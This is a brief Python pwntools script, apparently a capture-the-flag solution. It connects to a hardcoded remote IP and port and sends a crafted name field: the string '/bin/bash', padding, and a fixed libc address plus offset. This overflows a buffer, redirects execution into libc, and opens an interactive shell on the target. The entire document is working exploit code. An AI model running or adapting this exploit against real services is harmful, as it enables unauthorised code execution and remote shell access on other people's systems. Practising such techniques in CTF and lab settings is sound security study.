from pwn import *

io = remote("109.233.56.90", 11670)

io.recvuntil(b"> ")

win_libc = 0x7ffff7de3000
offset = 0x48f20

io.send('1\0')
io.sendafter(b"Enter your name: ", b'/bin/bash\0' + b'a'*(40-10) + p64(win_libc+offset))

io.interactive()
